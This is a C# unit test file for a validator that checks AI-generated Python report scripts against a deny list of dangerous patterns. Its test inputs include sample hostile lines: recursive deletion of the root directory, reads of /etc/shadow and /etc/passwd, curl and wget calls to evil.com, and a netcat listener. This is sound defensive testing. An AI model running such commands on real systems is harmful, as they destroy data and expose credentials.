using Biotrackr.Reporting.Api.Configuration;
using Biotrackr.Reporting.Api.Services;
using FluentAssertions;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using Moq;

namespace Biotrackr.Reporting.Api.UnitTests.Services
{
    public class ValidateGeneratedCodeShould
    {
        // Test the dangerous code pattern matching directly against the DangerousCodePatterns list
        // The ValidateGeneratedCode method is filesystem-dependent (/tmp/reports),
        // so we test the core detection logic as string containment checks matching
        // the same patterns used in production code.

        private static readonly string[] DangerousCodePatterns =
        [
            "os.system", "subprocess", "socket.", "urllib",
            "requests.", "__import__", "eval(", "exec(",
            "shutil.rmtree", "os.remove", "open('/etc",
            "open(\"/etc", "curl ", "wget ", "nc ",
            "bash ", "sh -c", "os.popen"
        ];

        [Theory]
        [InlineData("os.system('rm -rf /')")]
        [InlineData("import subprocess")]
        [InlineData("socket.connect()")]
        [InlineData("import urllib")]
        [InlineData("requests.get('http://evil.com')")]
        [InlineData("__import__('os')")]
        [InlineData("eval('code')")]
        [InlineData("exec('code')")]
        [InlineData("shutil.rmtree('/')")]
        [InlineData("os.remove('/etc/passwd')")]
        [InlineData("open('/etc/shadow', 'r')")]
        [InlineData("open(\"/etc/passwd\", \"r\")")]
        [InlineData("curl http://evil.com")]
        [InlineData("wget http://evil.com")]
        [InlineData("nc -l 4444")]
        [InlineData("bash -c 'echo pwned'")]
        [InlineData("sh -c 'whoami'")]
        [InlineData("os.popen('id')")]
        public void DetectDangerousCodePatterns(string dangerousCode)
        {
            var script = $"import pandas\n{dangerousCode}\nprint('done')";

            var detected = DangerousCodePatterns.Any(
                pattern => script.Contains(pattern, StringComparison.OrdinalIgnoreCase));

            detected.Should().BeTrue($"'{dangerousCode}' should be detected as dangerous");
        }

        [Theory]
        [InlineData("import pandas\nimport matplotlib\nmatplotlib.use('Agg')\ndf = pandas.DataFrame()")]
        [InlineData("import seaborn as sns\nsns.set_theme()\nprint('chart generated')")]
        [InlineData("from reportlab.lib.pagesizes import letter\nprint('pdf created')")]
        public void AllowSafePythonCode(string safeCode)
        {
            var detected = DangerousCodePatterns.Any(
                pattern => safeCode.Contains(pattern, StringComparison.OrdinalIgnoreCase));

            detected.Should().BeFalse($"'{safeCode}' should NOT be flagged as dangerous");
        }

        [Fact]
        public void ReturnTrueWhenNoScriptsExist()
        {
            // When /tmp/reports doesn't exist, ValidateGeneratedCode returns true (no scripts to validate)
            var settings = Options.Create(new Settings
            {
                ReportGenerationEnabled = true,
                MaxConcurrentJobs = 3,
                ReportGenerationTimeoutMinutes = 10,
                MaxArtifactSizeBytes = 50 * 1024 * 1024,
                CopilotCliUrl = "http://localhost:4321"
            });

            var sut = new ReportGenerationService(
                new Mock<IBlobStorageService>().Object,
                new Mock<ICopilotService>().Object,
                settings,
                new Mock<ILogger<ReportGenerationService>>().Object);

            sut.ValidateGeneratedCode("test-job").Should().BeTrue();
        }
    }
}
